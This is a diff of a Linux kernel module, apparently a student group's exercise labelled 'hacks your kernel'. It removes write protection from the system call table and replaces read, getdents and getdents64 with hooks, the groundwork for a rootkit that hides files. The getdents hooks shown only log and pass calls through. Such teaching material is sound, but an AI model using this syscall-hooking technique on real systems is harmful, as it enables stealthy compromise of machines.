@@ -4,18 +4,26 @@
 #include <linux/unistd.h>    /* Original read-call */
 #include <asm/cacheflush.h>  /* Needed for set_memory_ro, ...*/
 #include <asm/pgtable_types.h>
+#include <linux/types.h>
+#include <linux/syscalls.h>
+#include <linux/dirent.h>
 
 #include "sysmap.h"          /* Pointers to system functions */
 
 // the following line gets updated by script 
 
-
 // for convenience, I'm using the following notations for fun pointers:
 // fun_<return type>_<arg1>_<arg2>_<arg3>_...
 typedef int (*fun_int_void)(void);
+// for hooking the original read function
 typedef asmlinkage ssize_t (*fun_ssize_t_int_pvoid_size_t)(unsigned int, char __user *, size_t);
+// for hooking getdents (32 and 64 bit)
+typedef asmlinkage ssize_t (*fun_long_int_linux_dirent_int)(unsigned int, struct linux_dirent __user *, unsigned int);
+typedef asmlinkage ssize_t (*fun_long_int_linux_dirent64_int)(unsigned int, struct linux_dirent64 __user *, unsigned int);
 
-fun_ssize_t_int_pvoid_size_t original_read;
+fun_ssize_t_int_pvoid_size_t     original_read;
+fun_long_int_linux_dirent_int    original_getdents;
+fun_long_int_linux_dirent64_int  original_getdents64;
 
 /* Make a certain address writeable */
 void make_page_writable(long unsigned int _addr){
@@ -32,6 +40,7 @@ void make_page_readonly(long unsigned int _addr){
     pageTableEntry->pte = pageTableEntry->pte & ~_PAGE_RW;
 }
 
+// hooked functions
 asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf, size_t count){
     ssize_t retval;
     if (*buf && count > 1024){
@@ -41,21 +50,39 @@ asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf, size_t count){
     return retval;
 }
 
-/* Hooks the read system call. */
-void hook_function(void){
-  void** sys_call_table = (void *) ptr_sys_call_table;
-  original_read = sys_call_table[__NR_read];
+asmlinkage ssize_t hooked_getdents (unsigned int fd, struct linux_dirent __user *dirent, unsigned int count){
+    printk(KERN_INFO "hooked_getdents");
+    return original_getdents(fd, dirent, count);
+}
 
-  make_page_writable((long unsigned int) ptr_sys_call_table);
-
-  sys_call_table[__NR_read] = (void*) hooked_read;
+asmlinkage long hooked_getdents64 (unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count){
+    printk(KERN_INFO "hooked_getdents");
+    return original_getdents64(fd, dirent, count);
 }
 
 /* Hooks the read system call. */
-void unhook_function(void){
+void hook_functions(void){
+  void** sys_call_table = (void *) ptr_sys_call_table;
+  // retrieve original functions
+  original_read = sys_call_table[__NR_read];
+  original_getdents = sys_call_table[__NR_getdents];
+  original_getdents64 = sys_call_table[__NR_getdents64];
+  // remove write protection
+  make_page_writable((long unsigned int) ptr_sys_call_table);
+  // replace function pointers! YEEEHOW!!
+  sys_call_table[__NR_read] = (void*) hooked_read;
+  sys_call_table[__NR_getdents] = (void*) hooked_getdents;
+  sys_call_table[__NR_getdents64] = (void*) hooked_getdents64;
+}
+
+/* Hooks the read system call. */
+void unhook_functions(void){
   void** sys_call_table = (void *) ptr_sys_call_table;
   make_page_writable((long unsigned int) ptr_sys_call_table);
+  // here, we restore the original functions
   sys_call_table[__NR_read] = (void*) original_read;
+  sys_call_table[__NR_getdents] = (void*) original_getdents;
+  sys_call_table[__NR_getdents64] = (void*) original_getdents64;
   make_page_readonly((long unsigned int) ptr_sys_call_table);
 }
 /* Print the number of running processes */
@@ -73,14 +100,15 @@ static int __init _init_module(void)
 {
     printk(KERN_INFO "This is the kernel module of gruppe 6.\n");
     print_nr_procs();
-    hook_function();
+    hook_functions();
+    printk(KERN_INFO "Address of original_getdents: %p\n", original_getdents);
     return 0;
 }
 
 /* Exiting routine */
 static void __exit _cleanup_module(void)
 {
-    unhook_function();
+    unhook_functions();
     printk(KERN_INFO "Gruppe 6 says goodbye.\n");
 }
 
@@ -100,6 +128,5 @@ MODULE_LICENSE("GPL");
 /*
  * Module information
  */
-MODULE_AUTHOR("Philipp Müller, Roman Karlstetter");	/* Who wrote this module? */
+MODULE_AUTHOR("Philipp Müller, Roman Karlstetter");    /* Who wrote this module? */
 MODULE_DESCRIPTION("hacks your kernel");                /* What does it do? */
-
